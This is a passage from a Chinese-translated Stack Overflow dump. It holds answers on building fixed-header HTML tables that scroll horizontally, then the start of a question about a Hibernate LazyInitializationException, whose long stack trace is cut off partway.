3.  列数无关紧要 - 它的大小可以调整到您需要的列数。
4.  并非所有列都需要具有相同的宽度。
5.  标题一直到右侧滚动条的末尾。
6.  没有javascript！

...但有几点需要注意：

1.  在您一直向右滚动之前，垂直滚动条不可见。鉴于大多数人都有滚轮，这是一个可以接受的牺牲。

2.  滚动条的宽度必须是已知的。在我的网站上，我设置了滚动条的宽度（我不太关心旧的、不兼容的浏览器），因此我可以根据滚动条计算`div`和`table`调整宽度。

我不会在这里发布我的代码，而是发布一个指向 jsFiddle 的链接。

[固定标题表+向左/向右滚动](https://jsfiddle.net/bqbgcekr/4/)。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-09-21T11:44:52.850

[jsFiddle 中的工作示例](http://jsfiddle.net/UsKa3/1/)

这可以使用 div 来实现。也可以用桌子来完成。但我总是更喜欢div。

```
<body id="doc-body" style="width: 100%; height: 100%; overflow: hidden; position: fixed" onload="InitApp()"> 
    <div>
        <!--If you don't need header background color you don't need this div.-->
        <div id="div-header-hack" style="height: 20px; position: absolute; background-color: gray"></div>

        <div id="div-header" style="position: absolute; top: 0px; overflow: hidden; height: 20px; background-color: gray">                
        </div>

        <div id="div-item" style="position: absolute; top: 20px; overflow: auto" onscroll="ScrollHeader()">                
        </div>
    </div>
</body> 
```

**Javascript：**
这部分请参考 jsFiddle。否则这个答案会变得非常冗长。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-09-21T13:15:23.823

您可以使用以下 CSS 代码..

```
body {
    margin:0;
    padding:0;
    height: 100%;
    width: 100%;
}
table {
    border-collapse: collapse; /* make simple 1px lines borders if border defined */
}
tr {
    width: 100%;
}

.outer-container {
    background-color: #ccc;    
    top:0;
    left: 0;
    right: 300px;
    bottom:40px;
    overflow:hidden;

}
.inner-container {
    width: 100%;
    height: 100%;
    position: relative;

}
.table-header {
    float:left;
    width: 100%;
}
.table-body {
    float:left;
    height: 100%;
    width: inherit;

}
.header-cell {
    background-color: yellow;
    text-align: left;
    height: 40px;
}
.body-cell {
    background-color: blue;
    text-align: left;
}
.col1, .col3, .col4, .col5 {
    width:120px;
    min-width: 120px;
}
.col2 {
    min-width: 300px;
} 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2018-02-12T22:01:56.997

解决方法是使用JS水平滚动顶部div，使其与底部div匹配。

您必须**非常小心**以确保顶部和底部的尺寸完全相同，例如您可能需要使 TD 和 TH 使用固定宽度。

这是一个小提琴 [https://jsfiddle.net/jdhenckel/yzjhk08h/5/](https://jsfiddle.net/jdhenckel/yzjhk08h/5/)

重要部分：CSS 使用

```
.head {
  overflow-x: hidden;
  overflow-y: scroll;
  width: 500px;
}
.lower {
  overflow-x: auto;
  overflow-y: scroll;
  width: 500px;
  height: 400px;
} 
```

注意`overflow-y`必须在头部和下部相同。

和 Javascript...

```
var head = document.querySelector('.head');

var lower = document.querySelector('.lower');

lower.addEventListener('scroll', function (e) {
  console.log(lower.scrollLeft);
  head.scrollLeft = lower.scrollLeft;
}); 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2019-11-13T19:48:34.947

为此有一个 jquery 插件：[jquery.floatThead](https://mkoryak.github.io/floatThead/)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2022-02-22T14:49:47.080

众所周知，维护自己的解决方案并不是最好的。我建议尝试[vh-sticky-table-header](https://github.com/archfz/vh-sticky-table-header)。该模块启用粘性标题，它也适用于表格的水平滚动。

此外，它与框架无关，没有依赖关系，更适合现代 SPA 前端框架。

* * *

## 回答 #10

> 赞同：-2
> 
> 时间：2013-09-24T08:08:18.367

如果这是你想要的只有 HTML 和 CSS 解决方案

[小提琴](http://jsfiddle.net/GtYfy/)

这是HTML

```
<div class="outer-container"> <!-- absolute positioned container -->
<div class="inner-container">

    <div class="table-header">
        <table id="headertable" width="100%" cellpadding="0" cellspacing="0">
            <thead>
                <tr>
                    <th class="header-cell col1">One</th>
                    <th class="header-cell col2">Two</th>
                    <th class="header-cell col3">Three</th>
                    <th class="header-cell col4">Four</th>
                    <th class="header-cell col5">Five</th>
                </tr>
            </thead>
        </table>
    </div>

    <div class="table-body">
        <table id="bodytable" width="100%" cellpadding="0" cellspacing="0">
            <tbody>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
                <tr>
                    <td class="body-cell col1">body row1</td>
                    <td class="body-cell col2">body row2</td>
                    <td class="body-cell col3">body row2</td>
                    <td class="body-cell col4">body row2</td>
                    <td class="body-cell col5">body row2 en nog meer</td>
                </tr>
            </tbody>
        </table>
    </div>
</div>
</div> 
```

这是CSS

```
body {
margin:0;
padding:0;
height: 100%;
width: 100%;
}
table {
    border-collapse: collapse; /* make simple 1px lines borders if border defined */
}
tr {
    width: 100%;
}

.outer-container {
    background-color: #ccc;
    position: absolute;
    top:0;
    left: 0;
    right: 300px;
    bottom:40px;
    overflow: scroll;

}
.inner-container {
    width: 100%;
    height: 100%;
    position: relative;
    overflow-x: visible;
    overflow-y:visible;
}
.table-header {
    float:left;
    width: 100%;
}
.table-body {
    float:left;
    height: auto;
    width: auto;
    overflow: visible;
    background-color: red;
}
.header-cell {
    background-color: yellow;
    text-align: left;
    height: 40px;
}
.body-cell {
    background-color: transparent;
    text-align: left;
}
.col1, .col3, .col4, .col5 {
    width:120px;
    min-width: 120px;
}
.col2 {
    min-width: 300px;
} 
```

让我知道这是否是您需要的。或者有些东西不见了。我浏览了其他答案，发现已经使用了 jquery。我假设您需要 css 解决方案。如果我还有什么遗漏，请提及:)

# hibernate - 懒惰初始化集合失败，没有会话或会话被关闭（尽管急切地获取）

> ID：14977868
> 
> 赞同：2
> 
> 时间：2013-02-20T10:43:23.637
> 
> 标签：hibernate, jpa-2.0

好的，我在我正在处理的应用程序中遇到了上述异常。我正在使用 JPA 和休眠。这是堆栈跟踪：

```
WARNING: #{commissionController.saveCommission}: javax.persistence.PersistenceException: org.hibernate.LazyInitializationException: failed to lazily initialize a collection, no session or session was closed
javax.faces.FacesException: #{commissionController.saveCommission}: javax.persistence.PersistenceException: org.hibernate.LazyInitializationException: failed to lazily initialize a collection, no session or session was closed
    at com.sun.faces.application.ActionListenerImpl.processAction(ActionListenerImpl.java:118)
    at org.apache.myfaces.extensions.cdi.jsf.impl.security.SecurityViolationAwareActionListener.processAction(SecurityViolationAwareActionListener.java:56)
    at org.apache.myfaces.extensions.cdi.jsf.impl.config.view.ViewControllerActionListener.processAction(ViewControllerActionListener.java:68)
    at org.apache.myfaces.extensions.cdi.jsf.impl.listener.action.CodiActionListener.processAction(CodiActionListener.java:58)
    at javax.faces.component.UICommand.broadcast(UICommand.java:315)
    at javax.faces.component.UIViewRoot.broadcastEvents(UIViewRoot.java:794)
    at javax.faces.component.UIViewRoot.processApplication(UIViewRoot.java:1259)
    at com.sun.faces.lifecycle.InvokeApplicationPhase.execute(InvokeApplicationPhase.java:81)
    at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
    at com.sun.faces.lifecycle.LifecycleImpl.execute(LifecycleImpl.java:118)
    at org.apache.myfaces.extensions.cdi.jsf2.impl.listener.phase.CodiLifecycleWrapper.execute(CodiLifecycleWrapper.java:95)
    at javax.faces.webapp.FacesServlet.service(FacesServlet.java:593)
    at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:305)
    at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
    at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:222)
    at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:123)
    at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:472)
    at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:171)
    at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:99)
    at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:936)
    at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
    at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:407)
    at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1004)
    at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:589)
    at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:312)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1110)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:603)
    at java.lang.Thread.run(Thread.java:722)
Caused by: javax.faces.el.EvaluationException: javax.persistence.PersistenceException: org.hibernate.LazyInitializationException: failed to lazily initialize a collection, no session or session was closed
    at javax.faces.component.MethodBindingMethodExpressionAdapter.invoke(MethodBindingMethodExpressionAdapter.java:102)
    at com.sun.faces.application.ActionListenerImpl.processAction(ActionListenerImpl.java:102)
    ... 27 more
Caused by: javax.persistence.PersistenceException: org.hibernate.LazyInitializationException: failed to lazily initialize a collection, no session or session was closed
    at org.hibernate.ejb.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1377)
    at org.hibernate.ejb.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1300)
    at org.hibernate.ejb.AbstractEntityManagerImpl.convert(AbstractEntityManagerImpl.java:1306)
    at org.hibernate.ejb.AbstractEntityManagerImpl.merge(AbstractEntityManagerImpl.java:888)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.weld.bean.proxy.AbstractBeanInstance.invoke(AbstractBeanInstance.java:45)
    at org.jboss.weld.bean.proxy.ProxyMethodHandler.invoke(ProxyMethodHandler.java:105)
    at org.jboss.weld.proxies.EntityManager$1148094400$Proxy$_$$_WeldClientProxy.merge(EntityManager$1148094400$Proxy$_$$_WeldClientProxy.java)
    at se.raindance.persistence.RaindanceBaseHomeImpl.update(RaindanceBaseHomeImpl.java:57)
    at se.raindance.purchasecommission.home.CommissionHome.update(CommissionHome.java:59)
    at se.raindance.purchasecommission.home.CommissionHome$Proxy$_$$_WeldSubclass.update(CommissionHome$Proxy$_$$_WeldSubclass.java)
    at se.raindance.persistence.RaindanceBaseHomeImpl.persist(RaindanceBaseHomeImpl.java:67)
    at se.raindance.purchasecommission.home.CommissionHome.persist(CommissionHome.java:43)
    at se.raindance.purchasecommission.home.CommissionHome$Proxy$_$$_WeldSubclass.persist(CommissionHome$Proxy$_$$_WeldSubclass.java)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.weld.interceptor.proxy.SimpleInterceptionChain.invokeNextInterceptor(SimpleInterceptionChain.java:85)
    at org.jboss.weld.interceptor.proxy.InterceptorInvocationContext.proceed(InterceptorInvocationContext.java:127)
    at org.apache.myfaces.extensions.cdi.jpa.impl.transaction.TransactionalInterceptorStrategy.execute(TransactionalInterceptorStrategy.java:125)
    at org.apache.myfaces.extensions.cdi.jpa.impl.transaction.TransactionalInterceptor.executeInTransaction(TransactionalInterceptor.java:54)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.jboss.weld.interceptor.proxy.SimpleMethodInvocation.invoke(SimpleMethodInvocation.java:30)
    at org.jboss.weld.interceptor.proxy.SimpleInterceptionChain.invokeNextInterceptor(SimpleInterceptionChain.java:69)
    at org.jboss.weld.interceptor.proxy.InterceptorMethodHandler.executeInterception(InterceptorMethodHandler.java:112)
    at org.jboss.weld.interceptor.proxy.InterceptorMethodHandler.invoke(InterceptorMethodHandler.java:88)
    at org.jboss.weld.bean.proxy.CombinedInterceptorAndDecoratorStackMethodHandler.invoke(CombinedInterceptorAndDecoratorStackMethodHandler.java:55)
    at se.raindance.purchasecommission.home.CommissionHome$Proxy$_$$_WeldSubclass.persist(CommissionHome$Proxy$_$$_WeldSubclass.java)
    at se.raindance.purchasecommission.controller.CommissionController.saveCommission(CommissionController.java:139)
    at se.raindance.purchasecommission.controller.CommissionController$Proxy$_$$_WeldClientProxy.saveCommission(CommissionController$Proxy$_$$_WeldClientProxy.java)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.apache.el.parser.AstValue.invoke(AstValue.java:278)
    at org.apache.el.MethodExpressionImpl.invoke(MethodExpressionImpl.java:274)
    at org.jboss.weld.util.el.ForwardingMethodExpression.invoke(ForwardingMethodExpression.java:39)
    at org.jboss.weld.el.WeldMethodExpression.invoke(WeldMethodExpression.java:50)
    at com.sun.faces.facelets.el.TagMethodExpression.invoke(TagMethodExpression.java:105)
    at javax.faces.component.MethodBindingMethodExpressionAdapter.invoke(MethodBindingMethodExpressionAdapter.java:88)
    ... 28 more
Caused by: org.hibernate.LazyInitializationException: failed to lazily initialize a collection, no session or session was closed
    at org.hibernate.collection.internal.AbstractPersistentCollection.throwLazyInitializationException(AbstractPersistentCollection.java:489)
    at org.hibernate.collection.internal.AbstractPersistentCollection.throwLazyInitializationExceptionIfNotConnected(AbstractPersistentCollection.java:447)
    at org.hibernate.collection.internal.AbstractPersistentCollection.readSize(AbstractPersistentCollection.java:139)
    at org.hibernate.collection.internal.PersistentBag.isEmpty(PersistentBag.java:249)
    at se.raindance.purchasecommission.domain.Form.removeHiddenFields(Form.java:197)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.hibernate.ejb.event.BeanCallback.invoke(BeanCallback.java:39)
    at org.hibernate.ejb.event.EntityCallbackHandler.callback(EntityCallbackHandler.java:110)
    at org.hibernate.ejb.event.EntityCallbackHandler.postLoad(EntityCallbackHandler.java:103)
    at org.hibernate.ejb.event.EJB3PostLoadEventListener.onPostLoad(EJB3PostLoadEventListener.java:49)
    at org.hibernate.engine.internal.TwoPhaseLoad.doInitializeEntity(TwoPhaseLoad.java:292)
    at org.hibernate.engine.internal.TwoPhaseLoad.initializeEntity(TwoPhaseLoad.java:134)
    at org.hibernate.loader.Loader.initializeEntitiesAndCollections(Loader.java:999)
    at org.hibernate.loader.Loader.doQuery(Loader.java:878)
    at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:293)
    at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:263)
    at org.hibernate.loader.Loader.loadEntity(Loader.java:1977)
    at org.hibernate.loader.entity.AbstractEntityLoader.load(AbstractEntityLoader.java:82)
    at org.hibernate.loader.entity.AbstractEntityLoader.load(AbstractEntityLoader.java:72)
    at org.hibernate.persister.entity.AbstractEntityPersister.load(AbstractEntityPersister.java:3821)
    at org.hibernate.event.internal.DefaultLoadEventListener.loadFromDatasource(DefaultLoadEventListener.java:458)
    at org.hibernate.event.internal.DefaultLoadEventListener.doLoad(DefaultLoadEventListener.java:427)
    at org.hibernate.event.internal.DefaultLoadEventListener.load(DefaultLoadEventListener.java:204)
    at org.hibernate.event.internal.DefaultLoadEventListener.proxyOrLoad(DefaultLoadEventListener.java:260)
    at org.hibernate.event.internal.DefaultLoadEventListener.onLoad(DefaultLoadEventListener.java:148)
    at org.hibernate.internal.SessionImpl.fireLoad(SessionImpl.java:1079)
    at org.hibernate.internal.SessionImpl.internalLoad(SessionImpl.java:1006)
    at org.hibernate.type.EntityType.resolveIdentifier(EntityType.java:613)
    at org.hibernate.type.EntityType.resolve(EntityType.java:441)
    at org.hibernate.type.EntityType.replace(EntityType.java:298)
    at org.hibernate.type.AbstractType.replace(AbstractType.java:178)
    at org.hibernate.type.TypeHelper.replace(TypeHelper.java:211)
    at org.hibernate.event.internal.DefaultMergeEventListener.copyValues(DefaultMergeEventListener.java:409)
    at org.hibernate.event.internal.DefaultMergeEventListener.entityIsTransient(DefaultMergeEventListener.java:214)
    at org.hibernate.event.internal.DefaultMergeEventListener.onMerge(DefaultMergeEventListener.java:154)
    at org.hibernate.event.internal.DefaultMergeEventListener.onMerge(DefaultMergeEventListener.java:76)
    at org.hibernate.internal.SessionImpl.fireMerge(SessionImpl.java:904)
    at org.hibernate.internal.SessionImpl.merge(SessionImpl.java:888)
    at org.hibernate.internal.SessionImpl.merge(SessionImpl.java:892)
    at org.hibernate.ejb.AbstractEntityManagerImpl.merge(AbstractEntityManagerImpl.java:879)
    ... 71 more

feb 20, 2013 11:27:26 FM org.apache.deltaspike.core.api.provider.BeanProvider logWarningIfDependent
WARNING: BeanProvider shall not be used to create @Dependent scoped beans. Bean: Managed Bean [class se.raindance.webutil.cdi.common.HandlesGeneric] with qualifiers [@Any @Default]
feb 20, 2013 11:27:26 FM org.apache.deltaspike.core.api.provider.BeanProvider logWarningIfDependent
WARNING: BeanProvider shall not be used to create @Dependent scoped beans. Bean: Managed Bean [class se.raindance.webutil.cdi.common.HandlesPersistence] with qualifiers [@Any @Default]
2013-02-20 11:27:26,808 [http-bio-8080-exec-8] INFO  org.hibernate.event.internal.DefaultLoadEventListener - HHH000327: Error performing load command : org.hibernate.LazyInitializationException: failed to lazily initialize a collection, no session or session was closed
2013-02-20 11:27:26,811 [http-bio-8080-exec-8] WARN  org.hibernate.engine.loading.internal.LoadContexts - HHH000100: Fail-safe cleanup (collections) : org.hibernate.engine.loading.internal.CollectionLoadContext@4b2f3792<rs=org.hibernate.engine.jdbc.internal.proxy.ResultSetProxyHandler@3308315a[valid=false]>
2013-02-20 11:27:26,812 [http-bio-8080-exec-8] WARN  org.hibernate.engine.loading.internal.CollectionLoadContext - HHH000160: On CollectionLoadContext#cleanup, localLoadingCollectionKeys contained [1] entries
2013-02-20 11:27:26,822 [http-bio-8080-exec-8] ERROR se.raindance.webutil.cdi.common.HandlesGeneric - Printing stacktrace: -91600366
org.hibernate.LazyInitializationException: failed to lazily initialize a collection, no session or session was closed
    at org.hibernate.collection.internal.AbstractPersistentCollection.throwLazyInitializationException(AbstractPersistentCollection.java:489)
    at org.hibernate.collection.internal.AbstractPersistentCollection.throwLazyInitializationExceptionIfNotConnected(AbstractPersistentCollection.java:447)
    at org.hibernate.collection.internal.AbstractPersistentCollection.readSize(AbstractPersistentCollection.java:139)
    at org.hibernate.collection.internal.PersistentBag.isEmpty(PersistentBag.java:249)
    at se.raindance.purchasecommission.domain.Form.removeHiddenFields(Form.java:197)
    at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
    at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
    at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
    at java.lang.reflect.Method.invoke(Method.java:601)
    at org.hibernate.ejb.event.BeanCallback.invoke(BeanCallback.java:39)
    at org.hibernate.ejb.event.EntityCallbackHandler.callback(EntityCallbackHandler.java:110)
    at org.hibernate.ejb.event.EntityCallbackHandler.postLoad(EntityCallbackHandler.java:103)
    at org.hibernate.ejb.event.EJB3PostLoadEventListener.onPostLoad(EJB3PostLoadEventListener.java:49)
    at org.hibernate.engine.internal.TwoPhaseLoad.doInitializeEntity(TwoPhaseLoad.java:292)
    at org.hibernate.engine.internal.TwoPhaseLoad.initializeEntity(TwoPhaseLoad.java:134)
    at org.hibernate.loader.Loader.initializeEntitiesAndCollections(Loader.java:999)
    at org.hibernate.loader.Loader.doQuery(Loader.java:878)
    at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:293)
    at org.hibernate.loader.Loader.doQueryAndInitializeNonLazyCollections(Loader.java:263)
    at org.hibernate.loader.Loader.loadEntity(Loader.java:1977)
    at org.hibernate.loader.entity.AbstractEntityLoader.load(AbstractEntityLoader.java:82)
    at org.hibernate.loader.entity.AbstractEntityLoader.load(AbstractEntityLoader.java:72)
    at org.hibernate.persister.entity.AbstractEntityPersister.load(AbstractEntityPersister.java:3821)
    at org.hibernate.event.internal.DefaultLoadEventListener.loadFromDatasource(DefaultLoadEventListener.java:458)
    at org.hibernate.event.internal.DefaultLoadEventListener.doLoad(DefaultLoadEventListener.java:427)
    at org.hibernate.event.internal.DefaultLoadEventListener.load(DefaultLoadEventListener.java:204)
    at org.hibernate.event.internal.DefaultLoadEventListener.proxyOrLoad(DefaultLoadEventListener.java:260)
    at org.hibernate.event.internal.DefaultLoadEventListener.onLoad(DefaultLoadEventListener.java:148)
    at org.hibernate.internal.SessionImpl.fireLoad(SessionImpl.java:1079)
    at org.hibernate.internal.SessionImpl.internalLoad(SessionImpl.java:1006)
    at org.hibernate.type.EntityType.resolveIdentifier(EntityType.java:613)
    at org.hibernate.type.EntityType.resolve(EntityType.java:441)
    at org.hibernate.type.EntityType.replace(EntityType.java:298)
    at org.hibernate.type.AbstractType.replace(AbstractType.java:178)
    at org.hibernate.type.TypeHelper.replace(TypeHelper.java:211)
    at org.hibernate.event.internal.DefaultMergeEventListener.copyValues(DefaultMergeEventListener.java:409)
